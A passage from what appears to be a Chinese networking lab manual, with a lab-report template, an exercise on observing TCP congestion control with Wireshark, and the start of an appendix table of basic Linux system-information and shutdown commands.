其中 <span class="s32">source.c </span>为 <span class="s32">C </span>的源文件，<span class="s32">configuration.file </span>为相关配置文件。建议同学可以在

source.c <span class="s6">中的重要代码或者函数入口处添加注释，不做定性要求。 </span>

实验报告最好提交成 <span class="s32">doc </span>或者 <span class="s32">docx </span>格式的 <span class="s32">word </span>文档，格式如下，同学可以根据内容进行修改，但是各个项目不可省略。说明是为了更详细的解释各个项目，提交的试验

包中无需包含。 

<table style="border-collapse:collapse;margin-left:7.154pt" cellspacing="0"><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

实验目的 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:163pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

数据结构说明 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要解释各自的源代码中的数据结构，以及其用途。示例： 

      <span class="s34">struct xiaomaolv{ int id;</span>

floag weight; int age;

};

该结构是一个描述 <span class="s34">xiaomaolv </span>的结构，对应于现实生活农场中养的毛驴，其中 <span class="s34">id </span>是其在农场中的编号，<span class="s34">weight,age </span>分别代表了该毛驴的质量和年龄。 
</td></tr><tr style="height:43pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

配置文件说明（非必须） 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要给出配置文件的格式以及读取方式，如程序中没有用到配置文件，则该项可省略 
</td></tr><tr style="height:208pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

程序设计的思路以及运行流程 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：此处需要给出程序的运行流程或者思路。请给出如下两种格式之一：

1.  流程图

2.  流程说明示例：

    1.  程序开始

        2.  读取配置

        3.  检测数据

        4.  处理数据

            1.  正确 <span class="s34">goto 3</span>

                2.  错误 <span class="s34">goto 5</span>
    5.  程序结束

</td></tr><tr style="height:26pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

运行结果截图 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你的运行结果截图 
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

相关参考资料 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你完成该实验的参考书目或者网页 
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

对比样例程序 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你参考样例程序的部分，假如没有参考点，填无 
</td></tr><tr style="height:33pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

代码个人创新以及

思考 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请给出你认为你的源代码中的亮点，比如，针对某个细

节的处理或者算法的优化 
</td></tr><tr style="height:32pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

该程序的应用场景

创新（非必须） 
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：请思考一下，该类程序除了在背景中的应用之外，是否

还有其他可能的应用场景。 
</td></tr></table>

## <a name="bookmark37">实验七 </a><span class="s12">TCP </span>协议的拥塞控制机制观察

### <a name="bookmark38">实验任务</a>

仔细阅读课本中关于 <span class="s14">TCP </span>拥塞控制的介绍以及拥塞控制算法的状态自动机，完成以下任务。

1.  利用 <span class="s14">Wireshark </span>记录若干 <span class="s14">TCP </span>短流（少于 <span class="s14">5 </span>秒，如访问 <span class="s14">web </span>页面，收发邮件等）和<span class="s14">TCP</span>

长流（长于 <span class="s14">1 </span>分钟，如 <span class="s14">FTP </span>下载大文件，用<span class="s14">HTTP </span>观看在线视频等）。

2.  对于每个<span class="s14">TCP </span>流，画出其<span class="s14">congestion window </span>随时间的变化曲线，并指出拥塞控制的慢启动、拥塞避免、快恢复等阶段。

3.  画出每个<span class="s14">TCP </span>流的瞬时吞吐量，并统计其平均吞吐量和丢包率。

###
提交材料：实验报告

<a name="bookmark39">附录 </a><span class="h1">1. Linux </span>命令列表附录 <span class="h1">2. raw_socket</span>

Linux <span class="h3">命令列表</span>

### 目录

[系 统 信 息 ](#bookmark41)[60](#bookmark41)

[关 机 ](#bookmark42)[61](#bookmark42)

[文 件 和 目 录 ](#bookmark43)[62](#bookmark43)

[文 件 搜 索 ](#bookmark44)[63](#bookmark44)

[挂 载 一 个 文 件 系 统 ](#bookmark45)[64](#bookmark45)

[磁 盘 空 间 ](#bookmark46)[64](#bookmark46)

[用 户 和 群 组 ](#bookmark47)[65](#bookmark47)

[文 件 的 权 限 ](#bookmark48)[66](#bookmark48)

[文 件 的 特 殊 属 性 ](#bookmark49)[67](#bookmark49)

[打 包 和 压 缩 文 件 ](#bookmark50)[68](#bookmark50)

[查 看 文 件 内 容 ](#bookmark51)[69](#bookmark51)

[文 本 处 理 ](#bookmark52)[70](#bookmark52)

[字 符 设 置 和 文 件 格 式 ](#bookmark53)[71](#bookmark53)

[初 始 化 一 个 文 件 系 统 ](#bookmark54)[71](#bookmark54)

[SWAP ](#bookmark55)[文 件 系 统 ](#bookmark55)[72](#bookmark55)

[Backup 73](#bookmark56)

[网 络 ](#bookmark57)[(LAN / WiFi) 74](#bookmark57)

[Microsoft windows ](#bookmark58)[网 络 ](#bookmark58)[(samba) 75](#bookmark58)

[IPTABLES (firewall) 75](#bookmark59)

[监 视 和 调 试 ](#bookmark60)[76](#bookmark60)

[其 他 有 用 的 ](#bookmark61)[77](#bookmark61)

<table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark41">系统信息</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # arch
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示机器的处理器架构[(1) [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=arch)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cal 2007
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示 <span class="s52">2007 </span>年的日历表 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cal)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat /proc/cpuinfo
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示<span class="s52">CPU info</span>的信息 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cat)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat /proc/interrupts
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示中断 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cat)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat /proc/meminfo
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    校验内存使用 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cat)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat /proc/swaps
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示哪些<span class="s52">swap</span>被使用 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cat)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat /proc/version
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示内核的版本 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cat)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat /proc/net/dev
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示网络适配器及统计 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cat)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cat /proc/mounts
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示已加载的文件系统 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cat)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # clock -w
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将时间修改保存到[BIOS [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=clock)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # date
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示系统日期 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=date)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # date 041217002007.00
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置日期和时间<span class="s52">- </span>月日时分年<span class="s52">.</span>秒 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=date)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dmidecode -q
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示硬件系统部件[- (SMBIOS / DMI) [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=dmidecode)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # hdparm -i /dev/hda
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列一个磁盘的架构特性 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=hdparm)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # hdparm -tT /dev/sda
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在磁盘上执行测试性读取操作 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=hdparm)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # lspci -tv
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    罗列<span class="s52">PCI </span>设备 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=lspci)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # lsusb -tv
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示<span class="s52">USB </span>设备 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=lsusb)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # uname -m
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示机器的处理器架构[(2) [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=uname)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # uname -r
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示正在使用的内核版本 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=uname)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark42">关机</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # init 0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    关闭系统[(2) [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=init)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # logout
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    注销 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=logout)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # reboot
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    重启[(2) [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=reboot)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # shutdown -h now
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    关闭系统[(1) [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=shutdown)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # shutdown -h 16:30 &amp;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    按预定时间关闭系统 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=shutdown)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # shutdown -c
